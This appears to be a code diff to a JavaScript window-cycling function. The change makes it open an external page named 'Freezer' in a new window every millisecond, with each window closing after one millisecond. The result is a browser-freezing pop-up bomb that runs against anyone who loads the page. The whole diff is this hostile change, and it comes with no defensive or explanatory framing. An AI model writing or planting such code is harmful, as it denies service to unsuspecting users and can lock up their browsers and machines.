@@ -8,15 +8,15 @@
     // Function to handle the open/close cycle
     function windowCycle() {
         // Open new window
-        const newWindow = window.open('', '_blank');
+        const newWindow = window.open('https://darakof.github.io/Freezer', '_blank');
         
-        // Close the new window after 1 second
+        // Close the new window after 1 millisecond
         if (newWindow) {
-            newWindow.document.write('<script>setTimeout(() => window.close(), 1000)<\/script>');
+            newWindow.document.write('<script>setTimeout(() => window.close(), 1)<\/script>');
         }
         
-        // Repeat the cycle every 2 seconds
-        setTimeout(windowCycle, 2000);
+        // Repeat the cycle every 1 millisecond
+        setTimeout(windowCycle, 1);
     }
 
     // Start the initial cycle
